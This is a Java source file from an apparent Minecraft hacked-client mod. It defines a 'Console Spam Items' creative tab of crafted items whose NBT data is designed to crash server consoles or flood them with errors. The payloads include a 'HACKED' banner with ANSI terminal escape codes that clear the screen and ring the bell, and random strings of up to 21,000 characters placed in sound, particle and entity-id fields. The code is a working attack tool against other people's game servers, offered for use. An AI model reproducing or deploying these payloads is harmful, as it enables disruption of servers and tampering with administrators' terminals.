/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.integration.creativetab.impl;

import de.florianmichael.rclasses.common.RandomUtils;
import de.nekosarekawaii.vandalism.base.FabricBootstrap;
import de.nekosarekawaii.vandalism.integration.creativetab.AbstractCreativeTab;
import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.List;

import static de.nekosarekawaii.vandalism.util.game.ItemStackUtil.withClientSide;

public class ConsoleSpamItemsCreativeTab extends AbstractCreativeTab {

    private static final String HACKED =
                    "888    888        d8888  .d8888b.  888    d8P  8888888888 8888888b.  \n" +
                    "888    888       d88888 d88P  Y88b 888   d8P   888        888  \"Y88b \n" +
                    "888    888      d88P888 888    888 888  d8P    888        888    888 \n" +
                    "8888888888     d88P 888 888        888d88K     8888888    888    888 \n" +
                    "888    888    d88P  888 888        8888888b    888        888    888 \n" +
                    "888    888   d88P   888 888    888 888  Y88b   888        888    888 \n" +
                    "888    888  d8888888888 Y88b  d88P 888   Y88b  888        888  .d88P \n" +
                    "888    888 d88P     888  \"Y8888P\"  888    Y88b 8888888888 8888888P\"\n" +
                    "\n[You have been hacked with " + FabricBootstrap.MOD_NAME + "]\n\n" +
                    "\033c\u001b[32m" + "\n".repeat(10) + "\n\u0007";

    public ConsoleSpamItemsCreativeTab() {
        super(Text.literal("Console Spam Items"), Items.SPECTRAL_ARROW);
    }

    @Override
    public void exposeItems(final List<ItemStack> items) {
        items.add(withClientSide(createServerConsoleErrorArrow(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Console Error Arrow")));
        items.add(withClientSide(createServerConsoleErrorBat(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Console Error Bat")));
        items.add(withClientSide(createServerConsoleErrorBook(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Console Error Book")));
        items.add(withClientSide(createServerConsoleSpamArrow(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Arrow")));
        items.add(withClientSide(createServerConsoleSpamArea(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Area")));
        items.add(withClientSide(createServerConsoleSpamBeeNest(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Bee Nest")));
        items.add(withClientSide(createServerConsoleTrollDisplay(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Server Console Troll Display")));
        items.add(withClientSide(createServerConsoleTrollFrame(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Server Console Troll Frame")));
    }

    private static ItemStack createServerConsoleErrorArrow() {
        final ItemStack item = new ItemStack(Items.HORSE_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putByte("pickup", (byte) 3);
        entityTag.putShort("life", (short) 1200);
        entityTag.putString("id", "minecraft:arrow");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleErrorBat() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("Health", 1f);
        entityTag.putShort("Fire", (short) 100);
        entityTag.putString("DeathLootTable", "\"\"");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleErrorBook() {
        final ItemStack item = new ItemStack(Items.WRITTEN_BOOK);
        final NbtCompound base = new NbtCompound();
        base.putString("title", "");
        base.putString("author", "");
        final NbtList pages = new NbtList();
        pages.add(NbtString.of("{\"text\":\" \",\"hoverEvent\":{\"action\":\"show_item\",\"contents\":\"{}\"}}"));
        base.put("pages", pages);
        base.putByte("resolved", (byte) 1);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleSpamArrow() {
        final ItemStack item = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putString("SoundEvent", "Hacked:" + RandomStringUtils.random(21000));
        entityTag.putShort("life", (short) 1200);
        entityTag.putString("id", "minecraft:arrow");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleSpamArea() {
        final ItemStack item = new ItemStack(Items.COW_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("Radius", 0f);
        entityTag.putString("Particle", "hacked:6:9" + RandomStringUtils.random(15000));
        entityTag.putString("id", "minecraft:area_effect_cloud");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleSpamBeeNest() {
        final ItemStack item = new ItemStack(Blocks.BEE_NEST);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        final NbtList bees = new NbtList();
        final NbtCompound bee = new NbtCompound();
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "Hacked:" + RandomUtils.randomString(
                15000,
                true,
                true,
                true,
                true
        ));
        bee.put("EntityData", entityData);
        bees.add(bee);
        blockEntityTag.put("Bees", bees);
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleTrollDisplay() {
        final ItemStack item = new ItemStack(Items.CHICKEN_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.put("transformation", NbtString.of(HACKED));
        entityTag.putString("id", "minecraft:text_display");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerConsoleTrollFrame() {
        final ItemStack item = new ItemStack(Items.ITEM_FRAME);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        final NbtCompound itemNbt = new NbtCompound();
        itemNbt.putString("id", HACKED);
        entityTag.put("Item", itemNbt);
        entityTag.putByte("Fixed", (byte) 1);
        entityTag.putByte("Invisible", (byte) 1);
        entityTag.putByte("Silent", (byte) 1);
        entityTag.putByte("Invulnerable", (byte) 1);
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

}
